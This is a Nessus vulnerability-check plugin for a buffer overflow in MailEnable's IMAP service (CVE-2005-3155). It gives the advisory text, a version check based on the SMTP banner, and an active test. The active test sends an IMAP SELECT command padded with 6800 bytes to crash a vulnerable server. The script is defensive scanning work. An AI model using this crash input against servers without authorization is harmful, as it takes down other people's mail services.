#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote IMAP server is prone to a buffer overflow.

Description :

The remote host is running a version of MailEnable's IMAP service that
is prone to a buffer overflow vulnerability in its handling of W3C
logging.  An attacker may be able to exploit this to execute arbitrary
code subject to the privileges of the affected application, typically
Administrator. 

See also : 

http://forum.mailenable.com/viewtopic.php?t=8555
http://www.mailenable.com/hotfix/

Solution : 

Apply the 3 October 2005 IMAP Rollup Critical Update/Performance
Improvement Hotfix referenced in the vendor advisory above. 

Risk factor : 

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


if (description) {
  script_id(19783);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3155");
  script_bugtraq_id(15006);

  name["english"] = "MailEnable IMAP Logging Buffer Overflow Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for logging buffer overflow vulnerability in in MailEnable's IMAP service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("find_service.nes");
  script_exclude_keys("imap/false_imap");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("smtp_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


# Make sure the banner is for MailEnable.
banner = get_imap_banner(port:port);
if (!banner || "* OK IMAP4rev1 server ready" >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # nb: we'll won't do a banner check unless report_paranoia is 
  #     set to paranoid since the hotfix doesn't update the banner.
  if (report_paranoia <= 1) exit(0);

  # Check the version number from the SMTP server's banner.
  smtp_port = get_kb_item("Services/smtp");
  if (!smtp_port) smtp_port = 25;
  if (!get_port_state(smtp_port)) exit(0);
  if (get_kb_item('SMTP/'+smtp_port+'/broken')) exit(0);

  banner = get_smtp_banner(port:smtp_port);
  if (banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(
      pattern:"Version: (0-+)?([0-9][^- ]+)-*",
      string:banner,
      icase:TRUE
    );
    if (ver == NULL) {
      if (log_verbosity > 1) debug_print("can't determine version of MailEnable's SMTP connector service!", level:0);
      exit(1);
    }
    if (ver[1] == NULL) {
      edition = "Standard";
    }
    else if (ver[1] == "0-") {
      edition = "Professional";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise";
    }
    if (isnull(edition)) {
      if (log_verbosity > 1) debug_print("can't determine edition of MailEnable's SMTP connector service!", level:0);
      exit(1);
    }
    ver = ver[2];

    if (
      # nb: Professional versions <= 1.6 may be vulnerable.
      (edition == "Professional" && ver =~ "^1\.([0-5]|6$)") ||
      # nb: Enterprise versions <= 1.2 may be vulnerable.
      (edition == "Enterprise" && ver =~ "^1\.(0|1$)")
    ) {
      desc = str_replace(
        string:desc["english"],
        find:"See also :",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the version number of Mailenable\n",
          "***** installed there. Since the Hotfix does not change the version\n",
          "***** number, though, this might be a false positive.\n",
          "\n",
          "See also :"
        )
      );
      security_hole(port:port, data:desc);
    }
  }
 exit(0);
}
# Otherwise, try to exploit it.
else {
  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s)) {
    close(soc);
    exit(0);
  }

  # Try to exploit the flaw.
  #
  # nb: a vulnerable server will respond with a bad command and die after a few seconds.
  ++tag;
  c = string("nessus", string(tag), " SELECT ", crap(6800));
  send(socket:soc, data:string(c, "\r\n"));
  close(soc);
  sleep(5);

  # Try to reestablish a connection and read the banner.
  soc2 = open_sock_tcp(port);
  if (soc2) s2 = recv_line(socket:soc2, length:1024);

  # There's a problem if we couldn't establish the connection or read the banner.
  if (!soc2 || !strlen(s2)) {
    security_hole(port);
    exit(0);
  }
  close(soc2);
}
